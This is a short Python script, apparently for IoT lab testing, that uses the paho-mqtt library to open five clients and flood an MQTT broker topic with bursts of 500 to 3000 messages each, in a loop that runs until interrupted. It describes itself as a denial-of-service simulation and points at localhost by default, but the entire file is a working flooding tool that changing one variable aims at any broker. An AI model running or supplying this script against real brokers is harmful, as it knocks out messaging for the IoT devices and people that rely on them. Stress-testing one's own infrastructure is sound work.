import paho.mqtt.client as mqtt
import time

BROKER = "127.0.0.1"  # replace with your broker IP
PORT = 1883
TOPIC = "esp32/test" # your broker topic 
CLIENTS = 5
DELAY_BETWEEN_BURSTS = 1


while True:
    flood_level = input("Select flood intensity (low/mid/high): ").strip().lower()
    if flood_level in ["low", "mid", "high"]:
        break
    print("Invalid input. Please type 'low', 'mid', or 'high'.")

if flood_level == "low":
    MESSAGES_PER_LOOP = 500
elif flood_level == "mid":
    MESSAGES_PER_LOOP = 1500
else:
    MESSAGES_PER_LOOP = 3000

MESSAGE = f"Flood test message ({flood_level})"


def on_connect(client, userdata, flags, reasonCode, properties=None):
    if reasonCode == 0:
        print(f"[{client._client_id.decode()}] Connected to broker")
    else:
        print(f"[{client._client_id.decode()}] Failed to connect, rc={reasonCode}")

# Initialize clients
clients = []
for i in range(CLIENTS):
    client_id = f"DoSClient{i}"
    client = mqtt.Client(client_id=client_id)
    client.on_connect = on_connect
    client.connect(BROKER, PORT)
    client.loop_start()
    clients.append(client)

print(f"Starting MQTT DoS simulation ({flood_level})...")

try:
    while True:
        for client in clients:
            for _ in range(MESSAGES_PER_LOOP):
                client.publish(TOPIC, MESSAGE)
        print(f"Sent {MESSAGES_PER_LOOP*CLIENTS} messages in this burst")
        time.sleep(DELAY_BETWEEN_BURSTS)
except KeyboardInterrupt:
    print("Stopping DoS simulation")
    for client in clients:
        client.loop_stop()
        client.disconnect()
